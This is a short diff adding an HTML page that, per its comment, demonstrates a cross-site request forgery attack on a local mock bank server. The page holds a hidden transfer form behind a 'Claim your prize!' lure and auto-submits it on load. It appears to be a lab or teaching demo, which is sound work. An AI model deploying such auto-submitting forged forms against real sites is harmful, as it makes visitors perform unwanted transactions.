@@ -1,0 +1,6 @@
+<!-- When you run this webserver on other port say 5500 port, then it can make request to "mock bank server to make that cross site forgey attack" -->
+<form action="http://localhost:3000/transfer" method="POST">
+  <input type="hidden" name="amount" value="50" />
+  <input type="submit" value="Claim your prize!" />
+</form>
+<script>document.forms[0].submit();</script>
